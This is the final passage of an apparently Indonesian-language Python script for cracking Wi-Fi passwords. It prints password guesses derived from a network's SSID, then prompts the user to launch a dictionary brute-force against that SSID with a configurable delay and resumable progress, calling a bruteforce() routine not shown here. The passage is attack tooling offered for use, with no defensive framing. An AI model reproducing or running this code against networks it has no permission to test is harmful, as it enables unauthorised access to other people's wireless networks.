        print(f"\n  {C.GR}[+]{C.WH} Berdasarkan SSID '{ssid}':{C.RS}")
        for part in ssid_parts:
            if len(part) >= 3 and not part.isdigit():
                print(f"      {C.DM}→ {part.lower()}1234, {part.lower()}@1234, {part.lower()}123456{C.RS}")

    # ── Quick try option ──
    print(f"\n{C.GR}{'─'*52}{C.RS}")
    qt = input(f"  {C.WH}Lanjut brute force SSID ini dengan dictionary? (y/n): {C.RS}").strip().lower()
    if qt == "y":
        dict_path = choose_dictionary()
        if dict_path:
            di = input(f"  {C.WH}Delay (detik) [{C.DM}0.5{C.WH}]: {C.RS}").strip()
            try:
                delay = float(di) if di else 0.5
            except ValueError:
                delay = 0.5
            auth_key, _, _ = scan_and_find(ssid)
            if not auth_key:
                auth_key = "WPA2PSK"
            print(f"\n  {C.CY}[*] Mulai pengujian '{ssid}' menggunakan {os.path.basename(dict_path)}...{C.RS}")
            print(f"  {C.DM}Tekan Ctrl+C untuk stop & simpan progress{C.RS}")
            if input(f"  {C.WH}Lanjutkan? (y/n): {C.RS}").strip().lower() == "y":
                bruteforce(ssid, dict_path, delay, auth_key, shuffle=False)


if __name__ == "__main__":
    main()
